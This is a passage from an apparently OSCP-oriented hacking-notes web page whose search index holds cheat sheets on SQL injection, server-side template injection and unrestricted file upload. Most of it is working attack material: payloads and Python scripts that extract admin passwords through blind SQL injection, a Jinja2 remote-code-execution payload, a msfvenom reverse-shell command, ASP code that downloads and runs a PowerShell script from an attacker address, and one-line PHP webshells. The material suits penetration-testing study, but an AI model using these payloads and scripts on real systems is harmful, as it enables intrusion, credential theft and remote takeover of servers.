1 name from DATABASE..sysobjects where xtype='U')))-- # SELECT A N TABLE (OFFSET) a',convert(int,(SELECT name from DATABASE..sysobjects where xtype='U' ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY )))-- # SELECT A N COLUMN NAME(OFFSET) of TABLE a',convert(int,(SELECT name from DATABASE..syscolumns WHERE id = (SELECT id FROM DATABASE..sysobjects WHERE name = 'TABLE') ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))-- # DUMP - repeat it modifyng the OFFSET to retrieve all table entries a',convert(int,(SELECT username FROM DATABASE..TABLE ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))-- a',convert(int,(SELECT password FROM DATABASE..TABLE ORDER BY password OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))-- Example of MySQL: AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-- -) AND updatexml(rand(),concat(CHAR(126),user(),CHAR(126)),null)-- -) Blind SQLi A SQLi is blind because we don’t have access to the error log or any type of output which difficult a lot the process of exploitation. Triggering Conditional Responses We are going to try to distinct the application response to a TRUE and FALSE query. xyz' AND '1'='1 xyz' AND '1'='2 If we can get the difference of these two queries we can use substring to retrieve data. But first we need to know the lenght of the data to retrieve. xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) &gt; 5 -- - xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 15 -- - xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) &gt;'m xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) ='s The following is a python example script to automate the data retrieval of a alphanumerical 20 characters length password. import requests results = \"\" letters = '1234567890zxcvbnmasdfghjklqwertyuiopZXCVBNMASDFGHJKLQWERTYUIOP' headers = { \"User-Agent\": \"Mozilla 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit 537.36 (KHTML, like Gecko) Chrome 108.0.0.0 Safari 537.36\", \"Accept\": \"text html,application xhtml+xml,application xml;q=0.9,image avif,image webp,image apng,* *;q=0.8\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-Dest\": \"document\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"close\" } for i in range(20): print(\"[!] Character %s\" % str(i+1) ) for l in letters: payload = \"' AND SUBSTRING((SELECT username FROM users WHERE username='administrator'), %s,1) = '%s\" % (str(i+1), l) cookies = { \"TrackingId\": \"Xv2KlSXeuXAWb9NQ\" + payload, \"session\": \"iuxOBNDd4wHkhbbOiUVlQBHTv9AchuTu\" } r = requests.get(\"https: example.com sqli\", headers=headers, cookies=cookies) if \"Welcome back!\" in r.text: print(\" [+] Character Found: %s\" % l) results += l break; print(\"[!] Finished\") print(\"[+] Final results:\") print(results) Conditional Responses by triggering SQL errors If injecting different boolean conditions makes no difference to the application’s response we can force an error using the 1 0. Example of a OracleDB query: xyz' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1 0) ELSE 'a' END) ||'a xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1 0) ELSE 'a' END) ||'a If we can get the difference of these two queries we can use substring to retrieve data. xyz' || (SELECT CASE WHEN (LENGTH(password) &gt; 5) THEN TO_CHAR(1 0) ELSE '' END FROM users WHERE username = 'administrator') ||'a xyz' || (SELECT CASE WHEN (LENGTH(password) = 15) THEN TO_CHAR(1 0) ELSE '' END FROM users WHERE username = 'administrator') ||'a xyz' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) &gt; 'm') THEN TO_CHAR(1 0) ELSE '' END FROM users WHERE username = 'administrator') ||'a xyz' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 's') THEN TO_CHAR(1 0) ELSE '' END FROM users WHERE username = 'administrator') ||'a Time Based Since we are not aware about any type of error or output we can use sleeps. '; IF (1=2) WAITFOR DELAY '0:0:10'-- - '; IF (1=1) WAITFOR DELAY '0:0:10'-- - If it loads for four seconds extra we know that the database is processing our sleep() command. Dump tables It can also be done with sqlmap or manually with a custom script. In that case the script is dumping MD5 hashes from password field. import requests chars = \"0123456789abcdef\" def GetSQL(i,c): return \"admin' and substr(password,%s,1) = '%s' -- -\" % (i,c) for i in range(1,33): for c in chars: injection = GetSQL(i,c) payload = {'username':injection,'password':\"randompassword\"} r = requests.post('http: 10.10.10.73 login.php',data=payload) if 'Wrong identification' in r.text: print(c,end='',flush=True) break print() Note: MD5 hash are hexadecimal with 33 character length. https: github.com codingo OSCP-2 blob master Documents SQL%20Injection%20Cheatsheet.md References https: portswigger.net web-security sql-injection union-attacks https: sushant747.gitbooks.io total-oscp-guide content sql-injections.html https: portswigger.net web-security sql-injection cheat-sheet"
					}

					
				
			
		
			
				
					,
					

					"web-templates-injections": {
						"id": "web-templates-injections",
						"title": "Server Side Templates Injections (SSTI)",
						"category": "",
						"url": " /web/templates-injections/",
						"content": "SSTI (Server Side Templates Injections) occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. There are different frameworks that uses templates, this guide could help to detect which is and exploit them. Flask Flask is a framework for web applications written in Python and developed from the Werkzeug and Jinja2 tools. Syntax SSTI \\{\\{7*7\\}\\} \\{\\{ varname \\}\\} &lt;div data-gb-custom-block data-tag=\"if\" data-1='1'&gt;&lt; div&gt;PRINT&lt;div data-gb-custom-block data-tag=\"else\"&gt;NOPRINT&lt; div&gt; RCE (Remote Code Execution) &lt;div data-gb-custom-block data-tag=\"for\"&gt;&lt;div data-gb-custom-block data-tag=\"if\" data-0='warning'&gt;\\{\\{x()._module.__builtins__['__import__']('os').popen(\"touch tmp RCE.txt\").read()\\}\\}&lt; div&gt;&lt; div&gt; Note: Delete backslashs {{ }} in order to permorm the work desired. To bypass some restrictions take a look at the following resources: References https: pequalsnp-team.github.io cheatsheet flask-jinja2-ssti https: book.hacktricks.xyz pentesting-web ssti-server-side-template-injection https: github.com swisskyrepo PayloadsAllTheThings tree master Server%20Side%20Template%20Injection#jinja2"
					}

					
				
			
		
			
				
					,
					

					"web-unrestricted-file-upload": {
						"id": "web-unrestricted-file-upload",
						"title": "Unrestricted File Upload",
						"category": "",
						"url": " /web/unrestricted-file-upload/",
						"content": "Different ways to upload files and get RCE. Identifies restrictions Extension Shortening the size (falafel.htb): Linux maximum 255 chars touch $(python3 -c \"print('A'*251+'.png')\") wget 'http: 10.10.14.20:8000 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png' Search the correct offset and upload again: echo '&lt;?php system($_GET[\"cmd\"]);?&gt;' &gt; $(python3 -c 'print(\"A\"*(236-4)+\".php.png\")') wget 'http: 10.10.14.20:8000 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png' Size Name Magic Number Content ASP First we need to generate the reverse shell. msfvenom -p windows shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o rev.exe Finally upload the rev.asp and rev.exe files to get a connection shell back. Execute a binary &lt;% Dim oS On Error Resume Next Set oS = Server.CreateObject(\"WSCRIPT.SHELL\") Call oS.Run(\"win.com cmd.exe c c:\\Inetpub\\rev.exe\",0,True) %&gt; Read internal files &lt;% string path = @\"C:\\\\Windows\\\\win.ini\";  string txt = System.IO.File.ReadAllText(path);  Response.Write(txt);  %&gt; .config RCE (IIS) Uploading a web.config file to execute asp commands. &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=\"Read, Script, Write\"&gt; &lt;add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" &gt; &lt; handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=\".config\" &gt; &lt; fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=\"web.config\" &gt; &lt; hiddenSegments&gt; &lt; requestFiltering&gt; &lt; security&gt; &lt; system.webServer&gt; &lt; configuration&gt; &lt;% Response.write(1+1) %&gt; If this works we can execute a reverse shell. &lt;% Set objShell = CreateObject(\"WScript.Shell\") strCommand = \"cmd c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http: &lt;ip-addr&gt; shell.ps1')\" Set objShellExec = objShell.Exec(strCommand) strOutput = objShellExec.StdOut.ReadAll() WScript.StdOut.Write(strOutput) WScript.Echo(strOutput) %&gt; PHP The are some typicall PHP webshells, but some are detected by AV. Here are some usefull ones. https: github.com bayufedra Tiny-PHP-Webshell &lt;?=`$_GET[0]`?&gt; Usage : http: target.com path to shell.php?0=command &lt;?=`$_POST[0]`?&gt; Usage : curl -X POST http: target.com path to shell.php -d \"0=command\""
					}

					
				
			
		
	};
</script>
<script src="/hackingnotes/scripts/lunr.min.js"></script>
<script src="/hackingnotes/scripts/search.js"></script>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
